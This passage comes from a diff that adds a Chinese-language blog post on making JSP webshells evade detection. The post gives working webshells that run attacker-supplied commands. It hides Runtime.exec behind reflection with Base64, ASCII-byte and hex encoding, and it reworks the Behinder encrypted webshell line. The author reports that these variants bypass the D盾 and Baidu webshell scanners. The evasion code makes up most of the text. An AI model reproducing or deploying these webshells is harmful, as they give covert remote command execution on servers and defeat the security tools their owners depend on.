+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">BASE64Decoder</span> <span class="nx">code</span><span class="p">=</span><span class="nx">new</span> <span class="nx">sun</span><span class="p">.</span><span class="nx">misc</span><span class="p">.</span><span class="nf">BASE64Decoder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Class</span> <span class="nx">result</span><span class="p">=</span><span class="nx">new</span> <span class="nf">Myloader</span><span class="p">().</span><span class="nf">get</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nf">decodeBuffer</span><span class="p">(</span><span class="nx">classStr</span><span class="p">));</span><span class="c1">//将base64解码成byte数组，并传入t类的get函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">println</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nf">newInstance</span><span class="p">().</span><span class="nf">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行后成功调用计算器。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429054-a642ed04-8d95-4a86-993c-0b2568cc797a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>我们用类加载的方式成功执行了系统命令。</p>
+<h2 id="对命令执行jsp一句话免杀" class="headerLink">
+    <a href="#%e5%af%b9%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8cjsp%e4%b8%80%e5%8f%a5%e8%af%9d%e5%85%8d%e6%9d%80" class="header-mark"></a>3 对命令执行JSP一句话免杀</h2><p>JAVA执行系统命令的核心就是<code>Runtime.getRuntime().exec(cmd)</code></p>
+<h3 id="原型" class="headerLink">
+    <a href="#%e5%8e%9f%e5%9e%8b" class="header-mark"></a>3.1 原型</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;% if(&#34;023&#34;.equals(request.getParameter(&#34;pwd&#34;))){ 
+</span></span><span class="line"><span class="cl">java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;i&#34;)).getInputStream();
+</span></span><span class="line"><span class="cl">int a = -1; byte[] b = new byte[2048]; out.print(&#34;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1){
+</span></span><span class="line"><span class="cl">            out.println(new String(b,0,a));
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429209-d04cb3ef-d200-4b4b-a64c-cbd008e80021.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>经过二分法分析，发现特征码是在<code>Runtime.getRuntime().exec</code>这一句。不知道什么是二分法分析的看我以前的两篇webshell免杀文章。</p>
+<p>然后发现D盾对于JSP中只要有exec就会报一级。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429295-6062e8ff-65db-4154-806c-bffff73b509d.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>那么我们就可以利用类反射的方法来隐藏掉exec函数。</p>
+<h3 id="类反射绕过" class="headerLink">
+    <a href="#%e7%b1%bb%e5%8f%8d%e5%b0%84%e7%bb%95%e8%bf%87" class="header-mark"></a>3.2 类反射绕过</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Method</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Scanner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">op</span> <span class="p">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Class</span> <span class="nx">rt</span> <span class="p">=</span> <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span> <span class="c1">//加载Runtime类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">Method</span> <span class="nx">gr</span> <span class="p">=</span> <span class="nx">rt</span><span class="p">.</span><span class="nf">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">);</span>  <span class="c1">//获取getRuntime方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">Method</span> <span class="nx">ex</span> <span class="p">=</span> <span class="nx">rt</span><span class="p">.</span><span class="nf">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span> <span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">);</span>  <span class="c1">//获取exec方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">Process</span> <span class="nx">e</span> <span class="p">=</span> <span class="p">(</span><span class="nx">Process</span><span class="p">)</span> <span class="nx">ex</span><span class="p">.</span><span class="nf">invoke</span><span class="p">(</span><span class="nx">gr</span><span class="p">.</span><span class="nf">invoke</span><span class="p">(</span><span class="nx">null</span><span class="p">),</span>  <span class="s">&#34;cmd /c whoami&#34;</span><span class="p">);</span> <span class="c1">//invoke 传参调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//以下代码是获取输出结果
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">Scanner</span> <span class="nx">sc</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">Scanner</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nf">getInputStream</span><span class="p">()).</span><span class="nf">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">op</span> <span class="p">=</span> <span class="nx">sc</span><span class="p">.</span><span class="nf">hasNext</span><span class="p">()</span> <span class="err">?</span> <span class="nx">sc</span><span class="p">.</span><span class="nf">next</span><span class="p">()</span> <span class="p">:</span> <span class="nx">op</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">sc</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">print</span><span class="p">(</span><span class="nx">op</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到成功执行了whoami命令</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429390-e2cc0856-3f3a-4d98-82d1-177cbb5707c1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>那么接下来就是把他放到jsp里面。</p>
+<p>利用base64编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.misc.BASE64Decoder&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    if(request.getParameter(&#34;cmd&#34;)!=null){
+</span></span><span class="line"><span class="cl">        BASE64Decoder decoder = new BASE64Decoder();
+</span></span><span class="line"><span class="cl">        Class rt = Class.forName(new String(decoder.decodeBuffer(&#34;amF2YS5sYW5nLlJ1bnRpbWU=&#34;)));
+</span></span><span class="line"><span class="cl">        Process e = (Process)
+</span></span><span class="line"><span class="cl">                rt.getMethod(new String(decoder.decodeBuffer(&#34;ZXhlYw==&#34;)), String.class).invoke(rt.getMethod(new
+</span></span><span class="line"><span class="cl">                        String(decoder.decodeBuffer(&#34;Z2V0UnVudGltZQ==&#34;))).invoke(null, new
+</span></span><span class="line"><span class="cl">                        Object[]{}), request.getParameter(&#34;cmd&#34;) );
+</span></span><span class="line"><span class="cl">        java.io.InputStream in = e.getInputStream();
+</span></span><span class="line"><span class="cl">        int a = -1;
+</span></span><span class="line"><span class="cl">        byte[] b = new byte[2048];
+</span></span><span class="line"><span class="cl">        out.print(&#34;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1){
+</span></span><span class="line"><span class="cl">            out.println(new String(b));
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429484-989ad2dd-05ea-4a53-9d39-615a59634344.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429573-4b451e63-266a-49f1-92bc-9f350ebc3ea5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429667-305655ac-5adf-43a7-bfdb-f2b97e98d16d.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>可以bypass D盾跟百度scanner，下面的都是免杀的，就不截图了。</p>
+<p>利用ASCII编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34;  language=&#34;java&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    if(request.getParameter(&#34;cmd&#34;)!=null){
+</span></span><span class="line"><span class="cl">        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
+</span></span><span class="line"><span class="cl">        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter(&#34;cmd&#34;) );
+</span></span><span class="line"><span class="cl">        java.io.InputStream in = e.getInputStream();
+</span></span><span class="line"><span class="cl">        int a = -1;byte[] b = new byte[2048];out.print(&#34;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用HEX编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; import=&#34;javax.xml.bind.DatatypeConverter&#34; language=&#34;java&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    if(request.getParameter(&#34;cmd&#34;)!=null){
+</span></span><span class="line"><span class="cl">        Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary(&#34;6a6176612e6c616e672e52756e74696d65&#34;)));
+</span></span><span class="line"><span class="cl">        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary(&#34;65786563&#34;)), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary(&#34;67657452756e74696d65&#34;))).invoke(null), request.getParameter(&#34;cmd&#34;) );
+</span></span><span class="line"><span class="cl">        java.io.InputStream in = e.getInputStream();
+</span></span><span class="line"><span class="cl">        int a = -1;byte[] b = new byte[2048];out.print(&#34;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="寻找其他类" class="headerLink">
+    <a href="#%e5%af%bb%e6%89%be%e5%85%b6%e4%bb%96%e7%b1%bb" class="header-mark"></a>3.3 寻找其他类</h3><p>java中与执行命令相关的主要有两个类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java.lang.Runtime
+</span></span><span class="line"><span class="cl">java.lang.ProcessBuilder
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们上文中反射了Runtime类，那么同样我们也可以反射ProcessBuilder类。</p>
+<p>原理是相同的，此处不再具体举例实现。</p>
+<h2 id="对于冰蝎jsp一句话的免杀" class="headerLink">
+    <a href="#%e5%af%b9%e4%ba%8e%e5%86%b0%e8%9d%8ejsp%e4%b8%80%e5%8f%a5%e8%af%9d%e7%9a%84%e5%85%8d%e6%9d%80" class="header-mark"></a>4 对于冰蝎JSP一句话的免杀</h2><p>冰蝎JSP一句话的实现是我最佩服的一点，也是我今后想要加入到蚁剑中的功能。</p>
+<p>由于冰蝎中改写的是Object类，所以几乎全部都是非敏感函数。目前各大杀软查杀的规则也并不是特别完善，其实特别容易免杀。</p>
+<h3 id="免杀d盾" class="headerLink">
+    <a href="#%e5%85%8d%e6%9d%80d%e7%9b%be" class="header-mark"></a>4.1 免杀D盾</h3><p>经过二分法查找特征码，D盾对于冰蝎的查杀规则是这一句</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了简洁冰蝎作者把很多东西都写到一行里了。那么我们就把其中的变量拆出来试试。</p>
+<p>把base64解密那一块给抠出来，实例化给decoder变量。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@page import=&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+</span></span><span class="line"><span class="cl">public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;
+</span></span><span class="line"><span class="cl">&lt;%if(request.getParameter(&#34;pass&#34;)!=null){String k=(&#34;&#34;+UUID.randomUUID()).replace(&#34;-&#34;,&#34;&#34;).substring(16);session.putValue(&#34;u&#34;,k);
+</span></span><span class="line"><span class="cl">out.print(k);return;}
+</span></span><span class="line"><span class="cl">Cipher c=Cipher.getInstance(&#34;AES&#34;);
+</span></span><span class="line"><span class="cl">c.init(2,new SecretKeySpec((session.getValue(&#34;u&#34;)+&#34;&#34;).getBytes(),&#34;AES&#34;));
+</span></span><span class="line"><span class="cl">BASE64Decoder decoder=new sun.misc.BASE64Decoder();
+</span></span><span class="line"><span class="cl">new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就已经可以过D盾了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429763-051410dc-8afa-4cf4-b495-61b24f377d0c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>经过测试随便拆其他的也可以，再拆一个uploadString</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@page import=&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+</span></span><span class="line"><span class="cl">public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;
+</span></span><span class="line"><span class="cl">&lt;%if(request.getParameter(&#34;pass&#34;)!=null){String k=(&#34;&#34;+UUID.randomUUID()).replace(&#34;-&#34;,&#34;&#34;).substring(16);session.putValue(&#34;u&#34;,k);
+</span></span><span class="line"><span class="cl">out.print(k);return;}
+</span></span><span class="line"><span class="cl">Cipher c=Cipher.getInstance(&#34;AES&#34;);
+</span></span><span class="line"><span class="cl">c.init(2,new SecretKeySpec((session.getValue(&#34;u&#34;)+&#34;&#34;).getBytes(),&#34;AES&#34;));
+</span></span><span class="line"><span class="cl"> String uploadString= request.getReader().readLine();
+</span></span><span class="line"><span class="cl">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以免杀</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900429903-ea70127c-3c9f-4545-a98d-686dffe7ace6.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="免杀百度scanner" class="headerLink">
+    <a href="#%e5%85%8d%e6%9d%80%e7%99%be%e5%ba%a6scanner" class="header-mark"></a>4.2 免杀百度scanner</h3><p>拆最后一句免杀不了scanner</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430015-44ed95d8-c898-4762-a78b-1260212b6be2.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>经过测试scanner识别冰蝎的特征在这一句</p>
+<div class="highlight"><div class="chroma">
